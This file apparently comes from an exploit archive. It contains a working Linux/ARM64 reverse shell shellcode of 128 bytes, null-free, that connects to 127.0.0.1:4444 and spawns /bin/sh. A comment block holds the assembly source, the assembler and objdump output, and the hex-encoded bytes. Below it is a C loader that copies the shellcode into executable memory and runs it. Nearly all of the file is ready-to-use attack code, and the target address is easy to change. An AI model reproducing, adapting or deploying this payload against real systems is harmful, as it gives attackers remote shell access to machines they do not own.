/*
# Title:  Linux/ARM64 - Reverse (127.0.0.1:4444/TCP) Shell (/bin/sh) + Null-Free Shellcode (128 bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat revshell.s
.section .text
.global _start
_start:
    // s = socket(2, 1, 0)
    mov  x8, #198
    lsr  x1, x8, #7
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x4, x0

    // connect(s, &sockaddr, 16)
    lsl  x1, x1, #1
    movk x1, #0x5C11, lsl #16
    movk x1, #0x7F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x2
    mov  x2, #16
    mov  x8, #203
    svc  #0x1337

    lsr  x1, x2, #2

dup3:
    // dup3(s, 2, 0)
    // dup3(s, 1, 0)
    // dup3(s, 0, 0)
    mvn  x0, x4
    lsr  x1, x1, #1
    mov  x2, xzr
    mov  x8, #24
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x1
    bne  dup3

    // execve("/bin/sh", 0, 0)
    mov  x3, #0x622F
    movk x3, #0x6E69, lsl #16
    movk x3, #0x732F, lsl #32
    movk x3, #0x68, lsl #48
    str  x3, [sp, #-8]!
    add  x0, sp, x1
    mov  x8, #221
    svc  #0x1337
ubuntu@ubuntu:~/works$ as -o revshell.o revshell.s && ld -o revshell revshell.o
ubuntu@ubuntu:~/works$ objdump -d ./revshell

./revshell:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	d28018c8 	mov	x8, #0xc6                  	// #198
  40007c:	d347fd01 	lsr	x1, x8, #7
  400080:	d37ff820 	lsl	x0, x1, #1
  400084:	aa1f03e2 	mov	x2, xzr
  400088:	d40266e1 	svc	#0x1337
  40008c:	aa2003e4 	mvn	x4, x0
  400090:	d37ff821 	lsl	x1, x1, #1
  400094:	f2ab8221 	movk	x1, #0x5c11, lsl #16
  400098:	f2c00fe1 	movk	x1, #0x7f, lsl #32
  40009c:	f2e02001 	movk	x1, #0x100, lsl #48
  4000a0:	f81f8fe1 	str	x1, [sp,#-8]!
  4000a4:	8b2263e1 	add	x1, sp, x2
  4000a8:	d2800202 	mov	x2, #0x10                  	// #16
  4000ac:	d2801968 	mov	x8, #0xcb                  	// #203
  4000b0:	d40266e1 	svc	#0x1337
  4000b4:	d342fc41 	lsr	x1, x2, #2

00000000004000b8 <dup3>:
  4000b8:	aa2403e0 	mvn	x0, x4
  4000bc:	d341fc21 	lsr	x1, x1, #1
  4000c0:	aa1f03e2 	mov	x2, xzr
  4000c4:	d2800308 	mov	x8, #0x18                  	// #24
  4000c8:	d40266e1 	svc	#0x1337
  4000cc:	aa1f03ea 	mov	x10, xzr
  4000d0:	eb01015f 	cmp	x10, x1
  4000d4:	54ffff21 	b.ne	4000b8 <dup3>
  4000d8:	d28c45e3 	mov	x3, #0x622f                	// #25135
  4000dc:	f2adcd23 	movk	x3, #0x6e69, lsl #16
  4000e0:	f2ce65e3 	movk	x3, #0x732f, lsl #32
  4000e4:	f2e00d03 	movk	x3, #0x68, lsl #48
  4000e8:	f81f8fe3 	str	x3, [sp,#-8]!
  4000ec:	8b2163e0 	add	x0, sp, x1
  4000f0:	d2801ba8 	mov	x8, #0xdd                  	// #221
  4000f4:	d40266e1 	svc	#0x1337
ubuntu@ubuntu:~/works$ objcopy -O binary revshell revshell.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' revshell.bin && echo
\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2\xe1\x0f\xc0\xf2\x01\x20\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b\x02\x02\x80\xd2\x68\x19\x80\xd2\xe1\x66\x02\xd4\x41\xfc\x42\xd3\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2\xe3\x8f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
"\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2"
"\xe1\x0f\xc0\xf2\x01\x20\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b"
"\x02\x02\x80\xd2\x68\x19\x80\xd2\xe1\x66\x02\xd4\x41\xfc\x42\xd3"
"\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2"
"\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54"
"\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2"
"\xe3\x8f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}